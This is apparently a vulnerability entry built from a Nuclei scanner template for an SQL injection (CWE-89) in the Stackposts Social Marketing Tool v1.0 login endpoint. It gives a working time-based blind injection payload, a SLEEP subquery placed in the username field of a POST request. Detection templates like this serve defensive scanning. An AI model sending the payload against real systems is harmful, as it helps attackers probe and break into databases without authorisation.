# Vulnerability: Stackposts Social Marketing Tool v1.0 - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`stackposts-sqli.yaml`)

## Description
SQL Injection is a type of SQL injection attack in which an attacker can exploit a vulnerability in a web application's input fields to manipulate the application's SQL queries.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 15s
POST /spre/auth/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

username=1')AND (SELECT 9595 FROM (SELECT(SLEEP(7)))YRMM) AND ('gaNg'='gaNg&password=test
```

